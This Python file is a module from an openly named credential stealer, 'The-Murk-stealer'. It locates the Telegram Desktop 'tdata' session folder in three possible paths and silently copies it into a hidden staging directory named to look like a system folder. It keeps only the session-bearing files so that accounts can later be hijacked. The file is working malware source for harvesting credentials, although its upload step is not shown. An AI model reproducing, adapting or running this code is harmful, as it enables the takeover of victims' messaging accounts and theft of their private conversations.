#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
import shutil

path1 = 'D:\\Telegram Desktop\\tdata'
path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'


directory = r'C:\windll\Telegram'

def Telegram():
    try:
        shutil.copytree(path1,
                directory,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path2,
                directory,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path3,
                directory,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
